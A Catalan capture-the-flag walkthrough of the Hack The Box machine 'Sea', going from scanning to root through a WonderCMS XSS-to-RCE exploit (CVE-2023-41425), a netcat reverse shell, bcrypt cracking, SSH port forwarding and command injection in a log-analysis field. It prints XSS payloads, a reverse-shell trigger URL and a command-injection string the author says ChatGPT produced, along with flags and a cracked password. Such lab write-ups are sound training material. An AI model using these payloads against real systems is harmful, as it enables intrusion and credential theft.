
El primer que farem serà un nmap a la màquina que estem atacant:
``nmap -sC -sV -v 10.10.11.28``

Un cop fet l'nmap, veiem que la màquina víctima té els següents ports oberts amb els següents serveis:
``

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Ara hem de desar la pàgina amb el nom de domini permx.htb al nostre fitxer /etc/hosts per poder accedir-hi, com fem sempre:

``sudo nano /etc/hosts``

``10.10.11.28     sea.htb``

Un cop ho hem fet, accedim a la pàgina web a través del navegador i veiem el següent:

![image](https://github.com/user-attachments/assets/4ea8d657-47ea-42ae-90ab-ff8ad9dc91d7)

Veiem que és una pàgina d'una empresa que es dedica a organitzar aventures per ciclistes de nit i que ofereixen premis per els 3 primers ciclistes.

A la pàgina web no hi veig res a primer cop d'ull, per tant mirare el codi font:

```
<!DOCTYPE html>
<html lang="en">
    <head>
    	<meta charset="UTF-8">
    	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    	<meta name="viewport" content="width=device-width, initial-scale=1">
    	
        <title>Sea - How to</title>
        <meta name="description" content="A page description is also good for search engines.">
        <meta name="keywords" content="Enter, keywords, for, this page">
    	
        <link rel="stylesheet" href="[https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css](view-source:https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css)" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

	<!-- Admin CSS -->
	
	<!-- Theme CSS -->
	<link rel="stylesheet" href="[http://sea.htb/themes/bike/css/style.css](view-source:http://sea.htb/themes/bike/css/style.css)">
    </head>

    <body>
    	<div class="hero">
    		<div class="parallax-layer layer-6"></div>
    		<div class="parallax-layer layer-5"></div>
    		<div class="parallax-layer layer-4"></div>
    		<div class="parallax-layer bike-1"></div>
    		<div class="parallax-layer bike-2"></div>
    		<div class="parallax-layer layer-3"></div>
    		<div class="parallax-layer layer-2"></div>
    		<div class="parallax-layer layer-1"></div>
    		<div class="logo">
    			<center><img src="[http://sea.htb/themes/bike/img/velik71-new-logotip.png](view-source:http://sea.htb/themes/bike/img/velik71-new-logotip.png)" alt="" /></center>
    		</div>
    	</div>
    
                    
    	<nav class="navbar navbar-default">
    		<div class="container">
    			<div class="col-sm-5 text-center">
    				<div class="navbar-header">
    					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navMobile">&#9776;</button>
    					<a href="[http://sea.htb/](view-source:http://sea.htb/)"><h1>Sea</h1></a>
    				</div>
    			</div>
    			<div class="col-sm-7 text-center">
    				<div class="collapse navbar-collapse" id="navMobile">
    					<ul class="nav navbar-nav navbar-right">
                            <li class="nav-item ">
						<a class="nav-link" href="[http://sea.htb/home](view-source:http://sea.htb/home)">Home</a></li><li class="nav-item active ">
						<a class="nav-link" href="[http://sea.htb/how-to-participate](view-source:http://sea.htb/how-to-participate)">How to participate</a></li>
    					</ul>
    				</div>
    			</div>
    		</div>
    	</nav>
    
    	<div class="container">
    		<div class="col-xs-12 col-sm-8">
    			<div class="whiteBackground grayFont padding20 rounded5">
                    <h1>How can I participate?</h1>
<p>To participate, you only need to send your data as a participant through <a href="[http://sea.htb/contact.php](view-source:http://sea.htb/contact.php)">contact</a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.</p>
    			</div>
    		</div>
    		<div class="col-xs-12 col-sm-4">
    			<div class="visible-xs spacer20"></div>
    			<div class="blueBackground padding20 rounded5">
                    <h2>About</h2>

<br>
<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.</p>
    			</div>
    		</div>
    	</div>
        <br><br><br><br>
    	<footer class="container-fluid">
    		<div class="padding20 text-right">
                ©2024 Sea
    		</div>
    	</footer>
    
        <script src="[https://code.jquery.com/jquery-1.12.4.min.js](view-source:https://code.jquery.com/jquery-1.12.4.min.js)" integrity="sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ" crossorigin="anonymous"></script>
        <script src="[https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js](view-source:https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js)" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
        
    </body>
</html>`
```

Aquí al codi font hi trobem un formulari web, a través del qual s'hi han d'enviar les nostres dades per poder participar als esdeveniments:

![image](https://github.com/user-attachments/assets/7d5050c2-dcf0-479f-9e1a-6f1032266600)

El codi font del formulari:
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contact Form</title>
<style>
    body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        overflow: hidden;
    }
    #background {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #00274c;
        z-index: -1;
    }
    #stars {
        width: 1px;
        height: 1px;
        background: #fff;
        position: absolute;
        animation: twinkle 2s infinite;
    }
    @keyframes twinkle {
        0% {
            opacity: 1;
        }
        100% {
            opacity: 0;
        }
    }
    #container {
        position: relative;
        z-index: 1;
        max-width: 600px;
        margin: 50px auto;
        padding: 20px;
        background-color: rgba(255, 255, 255, 0.9);
        border-radius: 10px;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
    }
    h1 {
        text-align: center;
        margin-bottom: 30px;
        color: #00274c;
    }
    label {
        display: block;
        margin-bottom: 5px;
        color: #00274c;
    }
    input[type="text"],
    input[type="email"],
    input[type="number"] {
        width: calc(100% - 12px);
        padding: 8px;
        margin-bottom: 20px;
        border: 1px solid #ccc;
        border-radius: 5px;
    }
    input[type="text"]:focus,
    input[type="email"]:focus,
    input[type="number"]:focus {
        outline: none;
        border-color: #6fb3e0;
    }
    input[type="submit"] {
        background-color: #6fb3e0;
        color: #fff;
        border: none;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
    }
    input[type="submit"]:hover {
        background-color: #4a90c6;
    }
</style>
</head>
<body>

 

    <div id="background">
        <div id="stars"></div>
    </div>
    <div id="container">
        <h1>Competition registration - Sea</h1>
        
        <form action="[/contact.php](view-source:http://sea.htb/contact.php)" method="post">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>

            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>

            <label for="age">Age:</label>
            <input type="number" id="age" name="age" required>

            <label for="country">Country:</label>
            <input type="text" id="country" name="country" required>

            <label for="website">Website:</label>
            <input type="text" id="website" name="website">

            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>

```

Té vàris camps com a required, i el de website no, per tant provarem de fer injecció sql a veure si obtenim algun resultat. He encès el Burpsuite per veure com va la petició, quina info tinc i què rebo. Al fer la petició i fer un POST enviant el formulari veig el següent:

![image](https://github.com/user-attachments/assets/c70689f4-ec03-4cc4-96bd-a0023a6ff561)


```
POST /contact.php HTTP/1.1

Host: sea.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 116

Origin: http://sea.htb

Connection: close

Referer: http://sea.htb/contact.php

Cookie: PHPSESSID=1a0ifv2he709ov0itfm01pqj7t

Upgrade-Insecure-Requests: 1



name=%27+OR+%271%27%3D%271&email=hello%40hello.com&age=2&country=%27+OR+%271%27%3D%271&website=%27+OR+%271%27%3D%271`
```

I veiem el missatge per pantalla de que s'ha enviat el formulari correctament:

![image](https://github.com/user-attachments/assets/6655fb36-4ec4-4da3-a9eb-f747304b90cf)

Ara per veure si el servidor és vulnerable a XSS modificarem els camps de text (com `name`, `country`, o `website`) per introduir codi JavaScript.

- En el camp `name`, provarem a introduir: `<script>alert('XSS')</script>`
- En el camp `website`, provarem amb: `http://evil.com"><script>alert('XSS')</script>`

No hem tingut èxit. He provat una enumeració de dominis i subdominis però tampoc he tingut èxit:

``ffuf -u http://sea.htb -H "Host: FUZZ.sea.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949``

Últimament la gran majoria de màquines que hem fet, tenien algun domini ocult el qual havíem de descobrir, provarem amb una altra cerca de subdominis, ho provarem amb la llista de directoris medium, així estem en un terme mig i no haurem d'esperar molt com si féssim la big i tindrem més profunditat i possibles resultats que si ho fessim amb la small. Trobem directoris com themes, messages, plugins o data que ens redirigeixen, ja que tenen un 301, i ens redirigeixen i ens diuen que no tenim accés:

``ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sea.htb/FUZZ``

```
themes                  [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 95ms]
0                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 97ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 933ms]
#                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 938ms]
data                    [Status: 301, Size: 228, Words: 14, Lines: 8, Duration: 55ms]
# on atleast 2 different hosts [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 1374ms]
# Copyright 2007 James Fisher [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 1387ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 1450ms]
#                       [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 1450ms]
plugins                 [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 55ms]
messages                [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 96ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 474ms]
````

![image](https://github.com/user-attachments/assets/6dcc0325-0182-4ad2-8261-1a7465ee94f6)

Com a curiositat i lligat a la temàtica de la pàgina web, hi ha el domini bike:

![image](https://github.com/user-attachments/assets/2226f7b1-22f9-46e4-8962-6ccc923f6671)

Provaré a veure si a través d'aquí aconsegueixo alguna cosa amb útil. Provaré a veure si puc trobar cercant per els dominis que he trobat algun domini, és a dir dominis dins el domini. Ara però, filtrarem per respostes 200 i 301. Anirem fent això amb els diferents dominis dins de dominis trobats fins que trobem alguna cosa útil:

``ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://sea.htb/themes/bike/FUZZ -mc 200,301``

Hem obtingut aquestes respostes:

```
img                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 61ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 62ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 68ms]
css                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 68ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 60ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 68ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 68ms`
```

Hem trobat alguns directoris dins el directori /themes/bike, penso que per aquí al ser una web sobre competicions de bicis hem d'anar bé ja que portem molta estona i encara no hem trobat res. Enviaré la petició al repeater del Burpsuite així podré manipular-la des d'allà i veure la resposta.

Bé, després de gastar molt i molt de temps cercant, enumerant fitxers bàsics a mà dins dels directoris dins dels directoris que hem trobat, ens topem que a dins el directori /themes/bike/README.md hi veiem el text següent:

![image](https://github.com/user-attachments/assets/9d5ef80d-0626-4851-825c-b90a441e5a85)


```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.`
```

Hem cercat WonderCMS al navegador i trobem que WonderCMS es posiciona com un sistema de gestió de continguts de codi obert totalment gratuït. Un cop vist què és aquest WinderCMS, cercarem a veure si trobem algun exploit o POC a internet:

![image](https://github.com/user-attachments/assets/5eed554d-5c3f-42f8-998f-eeee41434a06)

De fet, només posar wondercms al navegador ja ens apareix com a segona cerca exploit i com a quarta default password. Primer cercaré l'exploit, a veure si tenim èxit. Vaig al prime de GitHub que trobo:

![image](https://github.com/user-attachments/assets/026d350a-c2cb-4d77-ab8c-dd29aace8c57)


https://github.com/prodigiousMind/CVE-2023-41425 

La descripció de l'exploit diu que: 

La vulnerabilitat de Cross Site Scripting a Wonder CMS v.3.2.0 a v.3.4.2 permet que un atacant remot executi codi arbitrari mitjançant un script dissenyat penjat al component installModule.

Per tant, a veure si fem sort i ens trobem davant una versió de Wonder CMS compatible amb aquest exploit. El repositori inclou amb captures de pantalla el POC, per tant anem a provar a veure si ens funciona. Aquest exploit és per el CVE-2023-41425 i funciona de la següent manera segons el pròpi repositori de GitHub:

L'exploit adjunt "exploit.py" realitza les següents accions:

1. Pren 3 arguments:
    - URL: on està instal·lat WonderCMS (no cal conèixer la contrasenya)
    - IP: la IP de la màquina de l'atacant
    - Núm. de port: el port de la màquina de l'atacant
2. Genera un fitxer xss.js (per a XSS reflectit) i mostra un enllaç maliciós.
3. Tan bon punt l'admin (usuari amb sessió iniciada) obre/clica l'enllaç maliciós, es realitzen unes quantes peticions en segon pla sense que l'admin ho noti per pujar una shell mitjançant la funcionalitat de pujar temes/complements.
4. Després de pujar la shell, s'executa la shell i l'atacant obté la connexió inversa del servidor.

Primer de tot descarreguem l'script fet amb python del repositori i li donem permisos d'execució:

```
┌──(root㉿kaliPol)-[/home/polkali]
└─# cd Documents/Sea      

┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
└─# ls
exploit.py
  
┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
└─# chmod u+x exploit.py `
```

Un cop fet això, hem d'executar l'exploit.py, posant la url, la nostre IP i el port per el qual escoltarem:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
└─# python3 exploit.py http://sea.htb/themes 10.10.14.106 4444  
``` 

I en un altre terminal escoltar per el port 4444 que és el que hem posat al executar l'exploit.py:

```
┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
```

A més a més, des d'un altre terminal hem de llençar la comanda següent, amb url, la nostre IP i el port per on estem escoltant. Hem de desencadenar el fitxer rev.php per establir la connexió del servidor objectiu amb la nostra màquina. Això ho podem saber revisant l'script exploit.py ja que hi ha una línia que es menciona diverses vegades en el codi (“GET”, urlWithoutLogBase + “/themes/revshell-main/rev.php”)

``curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.106&lport=4444'``

I ara veiem que des del port que estàvem escoltant estem dins la màquina que estem atacant amb l'usuari www-data:

```
┌──(polkali㉿kaliPol)-[~]
└─$ nc -nlvp 4444                                                                                                      
listening on [any] 4444 ...
connect to [10.10.14.185] from (UNKNOWN) [10.10.11.28] 51934
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 19:32:03 up  1:41,  1 user,  load average: 0.00, 0.02, 1.44
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami 
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Ara, haurem de cercar a veure si trobem credencials d'algun usuari per poder connectar-nos a través de ssh ja que la màquina víctima té el port 22 amb el servei ssh obert. Al home veiem que hi ha dos usuaris, però amb cap dels dos podem fer res, amb amay no podem obrir el fitxer que hi ha al home i amb geo no podem accedir al seu home:

```
$ cd home
$ ls
amay
geo
$ cd amay
$ ls
user.txt
$ cat user.txt
cat: user.txt: Permission denied
$ cd ..
$ cd geo
/bin/sh: 12: cd: can't cd to geo
$ 
```

Per tant, toca fer una cerca en profunditat pels directoris i fitxers del servidor web/màquina víctima. Després de donar moltes voltes, trobo aquest fitxer, que per el nom era molt prometedor, i efectivament, hi ha la contrasenya en hash  que deu ser d'un dels dos usuaris que hem trobat que tenen home:

```
$ cat /var/www/sea/data/database.js   
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": true,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/21 18:47:27": "127.0.0.1",
            "2024\/08\/21 18:37:56": "127.0.0.1",
            "2024\/08\/21 18:35:26": "127.0.0.1",
            "2024\/08\/21 18:27:56": "127.0.0.1",
            "2024\/08\/21 18:19:25": "127.0.0.1"
        },
        "lastModulesSync": "2024\/08\/21",
        "customModules": {
            "themes": {
                "0": "http:\/\/10.10.14.96:8000\/wcms-modules.json"
            },
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}$ `
```


Ara, el primer de tot és veure quin tipus de hash és, a veure si el podem "trencar". Primer de tot he anat a la web següent per veure el tipus de hash que és:

https://hashes.com/en/decrypt/hash

I veiem com ens diu el següent:

![image](https://github.com/user-attachments/assets/e07bfc9d-fdbf-48e1-a0a9-ccc9014e2b31)


Ara amb Jhon the ripper mirarem de "trencar" o crackejar el hash. El primer format que ens suggereix és el bcrypt per tant és el primer que provarem. Per començar ho provarem amb la llista més popular, la rockyou.txt. Abans però, desarem el hash a un fitxer per poder crackejar-lo:

![image](https://github.com/user-attachments/assets/b534ac5e-f285-41ae-960c-495e99cc7c9f)


``john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt``

Després de diverses proves i assaig error i força temps perdut sense èxit, veig que el hash té ``\/`` i s'han d'eliminar les ``\``.

Ara sí, tornem a executar la comanda utilitzant John the ripper i tenim èxit, al cap d'uns segons obtenim la contrasenya:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
└─# john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mychemicalromance (?)     
1g 0:00:00:26 DONE (2024-08-21 22:04) 0.03792g/s 116.7p/s 116.7c/s 116.7C/s osiris..milena
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ara, ens queda provar la connexió per ssh i veure si és la password de l'usuari amay o geo. Primer provem amb amay i tenim èxit:

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/Sea]
└─# ssh amay@10.10.11.28   
The authenticity of host '10.10.11.28 (10.10.11.28)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes`
```

Efectivament estem amb l'usuari amay:

```
amay@sea:~$ whoami
amay
amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
amay@sea:~$ `
```

Ara, anirem al home on com sempre a HTB hi trobarem la flag dins el fitxer user.txt:

```
amay@sea:~$ pwd
/home/amay
amay@sea:~$ ls
user.txt
amay@sea:~$ cat user.txt 
d36b9e6bf7d8cf3b643ca4668293d1a8`
```

I ja tenim la User Flag. Ara, haurem de mirar com escalar privilegis dins el servidor per obtenir la flag de l'usuari root.

Primer de tot provem amb sudo -l per veure què podem executar com a sudoers amb l'usuari amay, però no tenim èxit ja que ens demana contrasenya que no tenim:

```
amay@sea:~$ sudo -l
[sudo] password for amay:                                                                                                                     
Sorry, try again.                                                                           
[sudo] password for amay:                                                                 
Sorry, user amay may not run sudo on sea. 
```

Després d'estar estona cercant, he vist que altra gent ha utilitzat la tècnica de port forwarding, auqí hi ha info sobre què és: https://builtin.com/software-engineering-perspectives/ssh-port-forwarding?source=post_page-----55c0b226020e--------------------------------

Ho utilitzarem, i ara el que haurem de fer és, a la nostra màquina, la atacant, revisar que per exemple no estiguem utilitzant el port 8080:

``sudo lsof -i 8080``

I un cop revisat, llencem la comanda següent i posem la contrasenya de l'usuari amay: 

```
──(polkali㉿kaliPol)-[~]
└─$ sudo ssh -L 8080:localhost:8080 amay@sea.htb
The authenticity of host 'sea.htb (10.10.11.28)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:16: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yyes
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
amay@sea.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)`
```

Ara, anem al navegador i anem a`` localhost:8080`` ens sortirà una finestra demanant les credencials i posem les credencials de l'usuari amay. Ara veiem el següent:

![image](https://github.com/user-attachments/assets/6d201112-65ea-4715-8ca9-05a708b426da)


I si ens hi fixem a baix de tot a Analyze Log File veiem que hi ha acces.log i auth.log, utilitzarem Burpsuite per clicar a Analyze i veure si podem interceptar i aconseguir alguna cosa valuosa. He utilitzat el navegador propi de Burpsuite ja que amb el meu no m'ha funcionat i així no perdia el temps mirant quina configuració fallava:

![image](https://github.com/user-attachments/assets/a7648e5c-a730-4ba1-8e7e-2cf9ab87252d)


Ara, enviem al Repeater de Burpsuite les intercepcions que hem fet, i així podrem analitzar bé el que enviem als servidors i les seves respostes:

Després d'analitzar la resposta del servidor dels log que analitzem, ens trobem que a sota de tot hi ha el següent a l'access.log:

````
<p class='error'>Suspicious traffic patterns detected in /var/log/apache2/access.log:</p><pre>10.10.16.7 - - [24/Aug/2024:10:28:37 +0000] "GET /themes/revshell-main/rev.php?lhost=10.10.16.7 HTTP/1.1" 404 3666 "-" "curl/7.81.0"</pre>
````

![image](https://github.com/user-attachments/assets/38e81a4e-8f11-4dbe-b468-8891ae001717)


A diferència de l'auth.log on hi ha el següent:

![image](https://github.com/user-attachments/assets/1eae24a7-0daa-4dbb-bad3-dcd3049c157c)


Sembla que amb el que hem vist a l'access.log podríem enviar comandes al servidor. Provarem de modificar el log.file al Repeater per enviar alguna comanda a veure si tenim èxit. Funciona:

![image](https://github.com/user-attachments/assets/081e733f-ddce-4e5f-acda-50e84b3f1674)


Per tant, ara li demano al ChatGPT que em generi un payload per obtenir la root flag, i ens fa el següent payload:
``log_file=/root/root.txt;cat%20/root/root.txt%3E/tmp/root_flag.txt&analyze_log=``

### Explicació del payload:

- **log_file=/root/root.txt**: Canvia el fitxer de registre que s'analitza per `/root/root.txt`.
- **cat%20/root/root.txt%3E/tmp/root_flag.txt**: Això llegeix el contingut del fitxer `root.txt` i el redirigeix cap a un fitxer nou, `/tmp/root_flag.txt`, que potser podràs llegir amb permisos d'usuari normal.
- **%20**: Representa un espai.
- **%3E**: Representa el caràcter `>` que és utilitzat per redirigir la sortida d'un comando a un fitxer.

I així és com obtenim la root flag:

```
           </form>
            98ad116949266fe68da77aa104ceb3d5
<p class='error'>Suspicious traffic patterns detected in /root/root.txt;cat /root/root.txt>/tmp/root_flag.txt:</p><pre>98ad116949266fe68da77aa104ceb3d5</pre>`
```

![image](https://github.com/user-attachments/assets/392306b5-8528-49d3-b24f-71f6a4aaf296)

Com que el payload genera un fitxer al directori /tmp, també podem veure la root flag allà:

```
amay@sea:/tmp$ ls -la
total 60
drwxrwxrwt 14 root root 4096 Aug 24 11:04 .
drwxr-xr-x 19 root root 4096 Feb 21  2024 ..
drwxrwxrwt  2 root root 4096 Aug 24 09:03 .font-unix
drwxrwxrwt  2 root root 4096 Aug 24 09:03 .ICE-unix
-rw-r--r--  1 root root   33 Aug 24 11:01 root_flag.txt
drwx------  2 root root 4096 Aug 24 09:03 snap-private-tmp
drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-apache2.service-pnpGyf
drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-ModemManager.service-sd16Ag
drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-systemd-logind.service-hTZTei
drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-systemd-resolved.service-wpD20e
drwx------  3 root root 4096 Aug 24 09:03 systemd-private-bd97976328444518ad3ff60a76410e29-systemd-timesyncd.service-Qz1Sqj
drwxrwxrwt  2 root root 4096 Aug 24 09:03 .Test-unix
drwx------  2 root root 4096 Aug 24 09:03 vmware-root_806-2999526336
drwxrwxrwt  2 root root 4096 Aug 24 09:03 .X11-unix
drwxrwxrwt  2 root root 4096 Aug 24 09:03 .XIM-unix
amay@sea:/tmp$ cat root_flag.txt 
98ad116949266fe68da77aa104ceb3d5
```

Entreguem la root flag i ja tenim la màquina feta:

![image](https://github.com/user-attachments/assets/ded8d739-3ccf-48f1-be14-90032ff8b824)


